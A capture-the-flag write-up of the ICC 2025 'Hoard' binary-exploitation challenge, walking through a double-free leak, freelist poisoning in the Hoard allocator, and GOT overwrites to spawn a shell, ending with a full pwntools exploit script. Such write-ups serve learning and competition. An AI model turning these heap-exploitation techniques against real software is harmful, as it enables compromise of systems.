<h3> International Cybersecurity Challenge 2025 </h3>

Hey guys, h4cky0u here, I participated with team AFRICC at the ICC 2025 Tokyo, Japan.
<img width="1920" height="892" alt="image" src="https://github.com/user-attachments/assets/df0bbfd0-9b7d-425f-809c-92c7cfe66fcd" />

I mainly focused on the binary exploitation challenges where i solved 3/6 challenges.

This writeup contains the solution for the challenge named `Hoard` which had three solves and i was the 3rd blood..
<img width="1917" height="738" alt="image" src="https://github.com/user-attachments/assets/bd0cfbd8-defc-41f8-8dc2-034613841a10" />

```
Name: Hoard
Desc: Hoarding flags in a CTF is a shameful behavior and should be stopped.
Author: ptr-yudai
Link: http://hoard.org/
```

Here's the link to the attachment: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ICC25/files/firectf_icc-2025-whylz_distfiles_hoard-6543862fd682e5d69103645ac29369e3.tar)

We are provided with this files

```
~/Desktop/CTF/ICC25/Hoard/hoard ❯ ls -l
.rw-r--r-- mark mark 165 B  Thu Jan  1 00:00:00 1970 compose.yml
.rw-r--r-- mark mark 424 B  Thu Jan  1 00:00:00 1970 Dockerfile
.rw-r--r-- mark mark  11 B  Thu Jan  1 00:00:00 1970 flag.txt
.rwxr-xr-x mark mark  16 KB Thu Jan  1 00:00:00 1970 hoard
.rwxr-xr-x mark mark 473 KB Thu Jan  1 00:00:00 1970 libhoard.so
.rw-r--r-- mark mark 749 B  Thu Jan  1 00:00:00 1970 main.c
.rw-r--r-- mark mark  43 B  Thu Jan  1 00:00:00 1970 run
```

Kinda weird the timestamp all shows `Thu Jan 1 1970` when today's date is `Wed Nov 12 2025`

Looking through the docker file:

```
FROM ubuntu:24.04@sha256:04f510bf1f2528604dc2ff46b517dbdbb85c262d62eacc4aa4d3629783036096 AS base
RUN apt-get update && apt-get install libstdc++6
WORKDIR /app
ADD --chmod=555 run .
ADD --chmod=555 hoard .
ADD --chmod=555 libhoard.so .
ADD --chmod=444 flag.txt /flag.txt
RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt

FROM pwn.red/jail
COPY --from=base / /srv
ENV JAIL_TIME=300 JAIL_CPU=100 JAIL_MEM=10M
```

It basically just generates a random file name (this probably suggesting our goal is to get code execution) before setting up the red pwn jail.

So the important files we need to check now are: `run, hoard & libhoard.so`

The first file: basically sets the `LD_PRELOAD` variable to the shared library `libhoard.so`

```bash
#!/bin/sh
LD_PRELOAD=./libhoard.so ./hoard
```

We are given the binary source code so there's no need for reverse engineering...

```c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void reads(const char *prompt, char *buf, size_t len) {
  write(1, prompt, strlen(prompt));
  for (size_t i = 0; i < len; i++) {
    if (read(0, buf + i, 1) != 1)
      _exit(1);
    if (buf[i] == '\n') {
      buf[i] = '\0';
      break;
    }
  }
}

unsigned readi(const char *prompt) {
  char buf[0x10] = { 0 };
  reads(prompt, buf, sizeof(buf)-1);
  return (unsigned)atoi(buf);
}

char *note;

int main() {
  for (size_t i = 0; i < 0x100; i++) {
    switch (readi("> ")) {
      case 1: reads("data: ", note = malloc(8), 8); break;
      case 2: write(1, note, strlen(note)); write(1, "\n", 1); break;
      case 3: free(note); break;
      default: _exit(0);
    }
  }
  _exit(0);
}
```

Pretty straight forward code
- We can make up to 256 allocations where the size is constant
- The pointer is stored in the global variable `note`
- We can free the pointer stored in note as many times as we want

Some things to take note of:
- No IO functions being used
- _exit() is used

So now that we know how the code works, how to exploit it? 

Well the bug there is pretty obvious, after it frees the chunk it doesn't set the pointer to null this means we can double free a chunk and as well a Read-After-Free.

From the challenge description and setup code we see that it makes use of the `libhoard.so` file

I wasn't familiar with what Hoard meant but luckily the link to the source was given
<img width="1920" height="697" alt="image" src="https://github.com/user-attachments/assets/5c1f6dd8-6ff8-4934-ae2b-891b428b979d" />

So `Hoard` is essentially a memory allocator, others we have are `dlmalloc, ptmalloc, jemalloc` etc.

The project is open source so we can grab the source code from: [here](https://github.com/emeryberger/Hoard)

Since this is a memory allocator understanding a bit of how the (de)allocations works is necessary (i guess?)

I won't explain that here, you can read this [paper](https://www.cs.utexas.edu/~mckinley/papers/asplos-2000.pdf)

Hoard allocates memory from the system in chunks we call superblocks. Each superblock is an array of some number of blocks (objects) and contains a free list of its available blocks maintained
in LIFO order to improve locality. All superblocks are the same size (S), a multiple of the system page size. Objects larger than half the size of a superblock are managed directly using the virtual memory system (i.e., they are allocated via mmap and freed usingmunmap). All of the blocks in a superblock are in the same size class. By using size classes that are a power of b apart (where b is greater than 1) and rounding the requested size up to the near-est size class, we bound worst-case internal fragmentation within a block to a factor of b. In order to reduce external fragmentation, we recycle completely empty superblocks for re-use by any size class.

Anyways let's get to exploitation..

First `malloc` is hooked by the `libhoard.so` library to call this function

```c
#if defined(__GNUG__)
  void * xxmalloc (size_t sz)
#else
  void * __attribute__((flatten)) xxmalloc (size_t sz) __attribute__((alloc_size(1))) __attribute((malloc))
#endif
  {
    if (isCustomHeapInitialized()) {
      void * ptr = getCustomHeap()->malloc (sz);
      if (ptr == nullptr) {
	fprintf(stderr, "INTERNAL FAILURE.\n");
	abort();
      }
      return ptr;
    }
    // We still haven't initialized the heap. Satisfy this memory
    // request from the local buffer.
    void * ptr = initBufferPtr;
    initBufferPtr += sz;
    if (initBufferPtr > initBuffer + MAX_LOCAL_BUFFER_SIZE) {
      abort();
    }
    {
      static bool initialized = false;
      if (!initialized) {
	initialized = true;
#if !defined(_WIN32)
	/* fprintf(stderr, versionMessage); */
#endif
      }
    }
    return ptr;
  }
```

And `free`

```c
#if defined(__GNUG__)
  void xxfree (void * ptr)
#else
  void xxfree (void * ptr)
#endif
  {
    getCustomHeap()->free (ptr);
  }
```

Since this is a heap challenge this means we need to do heap related attacks, and we know this allocator manages free list using a LIFO data structure (similarly to Tcache)

But first there's something that we should take note of

During allocation, hoard first checks if the heap is already initialized and if it isn't initializes the heap and the memory allocated is gotten from making a `mmap` syscall

One thing about that is, when a chunk of memory is allocated using `mmap` the offset between the libc region and that memory is usually a bit constant 

So suppose we have an address of an mmap'ed chunk then we can offset it to get the libc base

To achieve this we need to first leak the address of the chunk, and we can do this using a double free

```python
def solve():
    for _ in range(0x10):
        read(b"A"*8)
    
    for _ in range(2):
        free()
    
    global_heap = write() 
    libc.address = global_heap - 0x3c0160
    info("global heap: %#x", global_heap)
    info("libc base: %#x", libc.address)
```

With libc leak gotten now we corrupt the pointer in the freelist to gain arb write 

Limitation with that is we can only write 8 bytes into the allocated memory...

What now? 

Checking the protection on libc we get this

```
~/Desktop/CTF/ICC25/Hoard/hoard/pew ❯ checksec libc.so.6 
[*] '/home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

So the GOT isn't writable, but that doesn't apply to the shared library `libhoard.so`

```
~/Desktop/CTF/ICC25/Hoard/hoard/pew ❯ checksec libhoard.so 
[*] '/home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

The library is mapped into memory

```
gef> vmmap
[ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00005592773dd000 0x00005592773de000 0x0000000000001000 0x0000000000000000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched
0x00005592773de000 0x00005592773df000 0x0000000000001000 0x0000000000001000 r-x /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched  <-  $rip
0x00005592773df000 0x00005592773e0000 0x0000000000001000 0x0000000000002000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched
0x00005592773e0000 0x00005592773e1000 0x0000000000001000 0x0000000000002000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched  <-  $r14
0x00005592773e1000 0x00005592773e4000 0x0000000000003000 0x0000000000003000 rw- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched
0x00007f3dc8400000 0x00007f3dc84a2000 0x00000000000a2000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc84a2000 0x00007f3dc85d2000 0x0000000000130000 0x00000000000a2000 r-x /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc85d2000 0x00007f3dc8660000 0x000000000008e000 0x00000000001d2000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc8660000 0x00007f3dc866f000 0x000000000000f000 0x000000000025f000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc866f000 0x00007f3dc8672000 0x0000000000003000 0x000000000026e000 rw- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc8672000 0x00007f3dc8676000 0x0000000000004000 0x0000000000000000 rw-
0x00007f3dc8800000 0x00007f3dc8828000 0x0000000000028000 0x0000000000000000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6
0x00007f3dc8828000 0x00007f3dc89b0000 0x0000000000188000 0x0000000000028000 r-x /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6
0x00007f3dc89b0000 0x00007f3dc89ff000 0x000000000004f000 0x00000000001b0000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6  <-  $r10, $r11
0x00007f3dc89ff000 0x00007f3dc8a03000 0x0000000000004000 0x00000000001fe000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6
0x00007f3dc8a03000 0x00007f3dc8a05000 0x0000000000002000 0x0000000000202000 rw- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6
0x00007f3dc8a05000 0x00007f3dc8a12000 0x000000000000d000 0x0000000000000000 rw-
0x00007f3dc8b10000 0x00007f3dc8b21000 0x0000000000011000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8b21000 0x00007f3dc8b9e000 0x000000000007d000 0x0000000000011000 r-x /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8b9e000 0x00007f3dc8bfe000 0x0000000000060000 0x000000000008e000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8bfe000 0x00007f3dc8bff000 0x0000000000001000 0x00000000000ed000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8bff000 0x00007f3dc8c00000 0x0000000000001000 0x00000000000ee000 rw- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8c00000 0x00007f3dc8c07000 0x0000000000007000 0x0000000000000000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
0x00007f3dc8c07000 0x00007f3dc8c0c000 0x0000000000005000 0x0000000000007000 r-x /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
0x00007f3dc8c0c000 0x00007f3dc8c0e000 0x0000000000002000 0x000000000000c000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
0x00007f3dc8c0e000 0x00007f3dc8c0f000 0x0000000000001000 0x000000000000e000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
0x00007f3dc8c0f000 0x00007f3dc8c10000 0x0000000000001000 0x000000000000f000 rw- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
```

So this means if we can overwrite the got of a function here then we can get rip control (limited to just 8 bytes)

Here i can easily get arbitrary 8 bytes write
<img width="1920" height="1024" alt="image" src="https://github.com/user-attachments/assets/fb2baa71-1242-4e57-93e0-f0f1c7526c50" />
<img width="1920" height="126" alt="image" src="https://github.com/user-attachments/assets/d8859501-b52c-4af6-bfde-bc7b41ed17bd" />

What to do? I did try use one gadget but as expected it failed!

Then i thought of checking the (xx)malloc/free function code path to see if there's any function pointer that resides in a rw region which i could overwrite to a  one gadget but i didn't do that because i might not find any and even if i did find, one gadget constraint might not be satisfied.

With this, I decided to take the path that would let me either build a ROP chain or call system("/bin/sh").

Doing the latter seems much easier, because if I can overwrite `xxfree@GOT` with `system` and make the note contain `/bin/sh`, then it’s profit, right?

Unfortunately it wasn't as easy as that!

The reason why it doesn't work is because after allocation the note pointer gets updated to the allocated memory

So here if we overwrite `xxfree@got` to `system` and we try to make a new allocation inorder to overwrite `note` it would make the program exit because the freelist is corrupted so it allocates memory to the function of xxfree itself, so when we attempt to write into that memory `read` will fail and the program handles that by exiting

<img width="1920" height="449" alt="image" src="https://github.com/user-attachments/assets/4e5e2841-c93d-45c5-984b-d44616d11ec0" />
<img width="1920" height="176" alt="image" src="https://github.com/user-attachments/assets/6ac3b61d-47fe-48bc-829c-3ed69b2378b6" />
<img width="1920" height="95" alt="image" src="https://github.com/user-attachments/assets/f6a9d3d1-cce0-48eb-957d-123b4a273edc" />
<img width="937" height="270" alt="image" src="https://github.com/user-attachments/assets/4a65143f-3b55-49bd-b2f6-05328854e386" />

So yes this is quite a complication...

What now? My goal still remained the same, find a way to write `/bin/sh` to `note`

And this is how i achieved it...

Like i initially already said, `note` contains the pointer to the got of `xxfree` and this means if we attempt to `free` it `rdi` now points to `note`

So instead of overwriting the got to `system`, i overwrote it to `gets`

Doing that, we get an unbounded overflow into the got of the `libhoard` library

Luckily `xxfree@got` was before `xxmalloc@got`
<img width="1920" height="943" alt="image" src="https://github.com/user-attachments/assets/69e7d994-1815-433b-b430-6afbb2b4288f" />

Basically what this means now is that, we can call gets to overwrite `xxfree` to `system` then overwrite `xxmalloc` to `malloc`

With this when we allocate a new memory the program would rather use glibc malloc!

And this would enable us to write `/bin/sh` to the heap and `xxfree` pointing to `system`

Recall i said:
- when a chunk of memory is allocated using `mmap` the offset between the libc region and that memory is usually a bit constant

In this case i had to run it multiple times because ASLR? makes the offset difference between the libc base and memory different on each run, but there's still chances of it being the same as the constant i hardcoded

Here's my local solve script:
<img width="1920" height="991" alt="image" src="https://github.com/user-attachments/assets/2116a753-f185-478c-8601-a24520633c36" />

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hoard_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    env = {"LD_PRELOAD":"libhoard.so"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pidof", "hoard"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, env=env, **kw)


gdbscript = '''
init-gef
brva 0x1384  
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def read(data):
    io.sendlineafter(b">", b"1")
    io.sendafter(b":", data)

def write():
    io.sendlineafter(b">", b"2")
    io.recvuntil(b" ")
    leak = io.recv(6)
    return u64(leak.ljust(8, b"\x00"))

def free():
    io.sendlineafter(b">", b"3")


def solve():

    for _ in range(0x10):
        read(b"A"*8)
    
    for _ in range(2):
        free()
    
    global_heap = write() 
    libc.address = global_heap - 0x3c0160
    info("global heap: %#x", global_heap)
    info("libc base: %#x", libc.address)
    
    got = libc.address + 0x40f078
    info("got free: %#x", got)

    try:
        read(p64(got))
        read(b"A"*8)
        read(p64(libc.sym["gets"]))
        free()

        rop = ROP(libc)
        pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
        sh = next(libc.search(b"/bin/sh\x00"))
        system = libc.sym["system"]

        payload = flat(
            [
                pop_rdi,
                sh,
                system
            ]
        )

        io.sendline(p64(libc.sym["system"]) + b"A"*(120-8) + p64(libc.sym["malloc"]))
        read(b"/bin/sh\x00")
        free()

        io.interactive()
    except Exception:
        io.close()


def main():
    for i in range(10):
        init()
        solve()
    

if __name__ == '__main__':
    main()
```

I really enjoyed this challenge tbh, i at first was in doubt as to whether i should give up on it and try something else, but good thing i pushed harder!

This was my first ICC and my first international onsite CTF, and it was an amazing experience. I really enjoyed the challenges, and I’m hoping to come back stronger for the next edition... watch out!

